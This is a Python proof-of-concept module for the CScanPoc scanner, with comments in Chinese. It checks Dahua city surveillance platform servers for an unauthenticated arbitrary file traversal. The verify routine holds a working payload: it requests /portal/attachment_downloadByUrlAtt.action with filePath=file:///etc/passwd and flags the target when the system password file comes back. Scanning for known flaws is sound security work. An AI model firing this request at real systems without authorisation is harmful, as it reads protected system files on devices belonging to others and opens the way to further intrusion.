# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    poc_id = '88f6a2cc-5ee0-48a9-96a9-d8a2d6d3b323'
    name = '大华城市安防监控系统平台管理存在任意文件遍历' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.MISCONFIGURATION # 漏洞类型
    disclosure_date = '2015-11-05'  # 漏洞公布时间
    desc = '''
        大华城市安防监控系统平台管理存在任意文件遍历(无需登录) 
    ''' # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=131730' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'Dahuatech'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'e27ed940-5935-463b-8156-7fa17b2017ef'
    author = '国光'  # POC编写者
    create_date = '2018-05-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            p = '/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd'
            url = arg + p
            code2, head, res, errcode, _ = hh.http(url )
            #print res
            if (code2 == 200) and('root:x:0:0:root:/root:/bin/bash' in res) :
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()